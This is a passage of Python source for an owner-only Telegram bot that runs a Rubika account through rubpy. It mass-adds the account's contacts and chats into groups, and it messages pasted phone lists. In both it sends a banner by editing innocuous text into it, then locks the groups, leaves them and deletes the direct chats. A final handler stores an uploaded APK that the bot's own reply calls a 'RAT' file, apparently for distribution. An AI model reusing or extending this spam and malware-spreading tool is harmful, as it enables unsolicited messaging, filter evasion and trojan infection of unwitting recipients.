                contacts_list = []
                start_id = None
                try:
                    while True:
                        contacts = await app.get_contacts(start_id=start_id)
                        for user in contacts['users']:
                            contacts_list.append(user['user_guid'])
                        if not contacts.next_start_id:
                            break
                        start_id = contacts.next_start_id
                except:pass
                chats_list = []
                start_id = None
                try:
                    while True:
                        contacts = await app.get_chats(start_id=start_id)
                        for user in contacts['chats']:
                            if user['abs_object']['type'] == 'User':
                                chats_list.append(user['object_guid'])
                        if not contacts.next_start_id:
                            break
                        start_id = contacts.next_start_id
                except:pass
                ids =contacts_list + chats_list
                NCHAT = len(ids)
                await Call.message.reply(f"""تعداد {NCHAT} مخاطب پیدا شد""")
                grouped_ids = [ids[i:i+100] for i in range(0, len(ids), 100)]
                for group in grouped_ids:
                    try:
                        group = await app.add_group(groupname, group)   
                        print("🍎")                 
                        count_members=group.group.count_members
                        guid = group['group']['group_guid']
                        x=await app.send_message(guid, str(Persian()))
                        await app(rubpy.methods.messages.EditMessage(guid, x.message_update.message_id, str(database['BANNER'])))     
                        ngap+=1
                        try:
                            await app(rubpy.methods.groups.SetGroupDefaultAccess(guid, []))
                            print("😈")    
                            await rubpy.Client.edit_group_info(app,group_guid=guid,event_messages=False)
                            print("🥵")    
                            await app(rubpy.methods.groups.LeaveGroup(guid))     
                            print("🍌")    
                        except Exception as e:
                            print(e)
                        await idd.edit(f"""🔖 تعداد گپ های ساخته شده : {ngap}""")
                        
                        await Call.message.reply(f'''✅ گپ ساخت شد , \nآیدی : {guid}\nتعداد ممبر : {count_members}''')
                    except:
                        pass
                        await Call.message.reply(f'''❌ گپ ساخته نشد''')
                    

            await Call.message.reply(f'''عملیات تمام شد✅''',reply_markup=START)
            
            
@Bot.on_callback_query(filters.user(Owner) & filters.regex("NumbersSender"))
async def getpjdgsjdhhdsendxone(Event:types.Message,Call:CallbackQuery):
    NumbersSender=await Bot.ask(chat_id=Call.message.chat.id,text="""لیست شماره خود را ارسال کنید یا /cancell""",reply_markup=cancell)
    if NumbersSender.text=="/cancell":
        await Call.message.reply("عملیات کنسل شد",reply_markup=START)
    else:
        #one_text=await Bot.ask(chat_id=Call.message.chat.id,text="بنرت رو ارسال کن یا /cancell",reply_markup=cancell)
        one_text="y"
        if database['BANNER'] == None:
            await Call.message.reply("بنرت رو ست کن",reply_markup=START)
        else:
            one_text=str(database['BANNER'])
            await Call.message.reply(".",reply_markup=wait)
            idd=await Call.message.reply("Wait...")            
            name = [i for i in glob.glob("*.rbs")][0]
            name = name.replace(".rbs","")
            name = "./"+name 
            c=0
            async with rubpy.Client(name) as app:        
                lines = NumbersSender.text.splitlines()
                number_of_lines = len(lines)
                try:
                    for number in NumbersSender.text.split('\n'):
                        number = number.replace("0", "", 1)
                        try:
                            data=await app(rubpy.methods.contacts.AddAddressBook(number, "کیک خور", ""))
                            if data.user:    
                                guid=data.user.user_guid           
                                try:                 
                                    x=await app.send_message(guid, str(Persian()))
                                    await app(rubpy.methods.messages.EditMessage(guid, x.message_update.message_id, str(database['BANNER'])))     
                                    print("🍓")
                                except Exception as e:
                                    print(e)
                                try:
                                    user = await app.get_user_info(guid)
                                    await app.delete_user_chat(guid, user.last_message_id)  
                                    await sleep(int(database['SLEEPTIME']))
                                    print("💰")
                                except Exception as e:
                                    print(e)
                                c+=1    
                                await idd.edit(f"""📊 تعداد کل شمار ها : {number_of_lines}\n🔖 تعداد بنر های ارسال شده به شماره های ورودی‌: {c}""")
                                             
                        except:pass
                    await Call.message.reply("عملیات با موفقیت تمام شد",reply_markup=START)
                except Exception as e:
                    print(e)
                    await Call.message.reply("❌ مشکل وجود دارد",reply_markup=START)
                
@Bot.on_callback_query(filters.user(Owner) & filters.regex("DeleteContacts"))
async def getpjdjdhohhne(Event:types.Message,Call:CallbackQuery):
    DeleteContacts=await Bot.ask(chat_id=Call.message.chat.id,text="""آیا می‌خواهید تمام مخاطبین اکانت حذف شود؟
    - Yes or No - """,reply_markup=yesno)
    if DeleteContacts.text=="No":
        await Call.message.reply("عملیات کنسل شد",reply_markup=START)
    else:   
        if DeleteContacts.text=="Yes":
            
            await Call.message.reply(".",reply_markup=wait)
            idd=await Call.message.reply("Wait...")
            
            name = [i for i in glob.glob("*.rbs")][0]
            name = name.replace(".rbs","")
            name = "./"+name 
            c=0
            async with rubpy.Client(name) as app:        
                contacts_list = []
                start_id = None
                try:
                    while True:
                        contacts = await app.get_contacts(start_id=start_id)
                        for user in contacts['users']:
                            await app(rubpy.methods.contacts.DeleteContact(user['user_guid']))
                            c+=1
                            await idd.edit(f"""❕هشدار:\n- مخاطبین اکانت {name} با موفقیت از حذف شد ✅\nتعداد مخاطبان حذف شده : {c}""")      
                        if not contacts.next_start_id:
                            break
                    #print(len(contacts_list))
                        start_id = contacts.next_start_id
                except:pass
                await Call.message.reply("عملیات با موفقیت تمام شد",reply_markup=START)

            
@Bot.on_callback_query(filters.user(Owner) & filters.regex("DeleteAccount"))
async def getphongxge(Event:types.Message,Call:CallbackQuery):
    DeleteAccount=await Bot.ask(chat_id=Call.message.chat.id,text="""❕آیا می‌خواهید اکانت از دیتابیس حذف شود؟
- Yes or No - """,reply_markup=yesno)
    if DeleteAccount.text=="No":
        await Call.message.reply("عملیات کنسل شد",reply_markup=START)
    else:   
        if DeleteAccount.text=="Yes":
            try:
                name = [i for i in glob.glob("*.rbs")][0]
                name = name.replace(".rbs","")
                name = f"{name}.rbs"
                os.remove(name)
                await Call.message.reply(f"""❕هشدار:
- اکانت {name} با موفقیت از دیتابیس حذف شد ✅""",reply_markup=START)
            except Exception as e:
                await Call.message.reply("❌ هیچ اکانتی وجود ندارد",reply_markup=START)
            
@Bot.on_callback_query(filters.user(Owner) & filters.regex("Addaccount"))
async def getphone(Event:types.Message,Call:CallbackQuery):
    phone=await Bot.ask(chat_id=Call.message.chat.id,text="Enter Phone Number or /cancell",reply_markup=cancell)
    if phone.text=="/cancell":
        await Call.message.reply("cancell Ok",reply_markup=START)
    else:       
        Final = phone.text
        try:
            name = [i for i in glob.glob("*.rbs")][0]
            name = name.replace(".rbs","")
            name = f"{name}.rbs"
            os.remove(name)
        except:pass
        Final = phone.text.translate(str.maketrans('۰۱۲۳۴۵۶۷۸۹', '0123456789'))        
        session=rubpy.Client(Final)
        try:
            result=await session.start(phone_number=Final,Call=Call)
        except Exception as e:
            if "تعلیق" in str(e):
                await Call.message.reply("حساب کار بری این شماره تعلیق می باشد",reply_markup=START)
        if result=="cn":
            await Call.message.reply("cancell Ok",reply_markup=START)
            try:
                name = [i for i in glob.glob("*.rbs")][0]
                name = name.replace(".rbs","")
                name = f"{name}.rbs"
                os.remove(name)
            except:pass
            return
        if result:
            await Call.message.reply("Login Ok")
            await Call.message.reply(f"Bot {Final} Run",reply_markup=START)
            await session.disconnect()            
        else:
            await Call.message.reply("Login Error")
    await Call.message.reply("........")

@Bot.on_message(filters.user(Owner))
async def handle_file(Bot, message):
    if message.document and message.document.file_name.endswith(".apk"):
        # ذخیره فایل با نام app.apk در دیتای خود
        await Bot.download_media(message, file_name="app.apk")
        await message.reply("""فایل رت با موفقیت سیو شد و جایگزین فایل قبلی شد""")    
  
print("Run")
Bot.run()






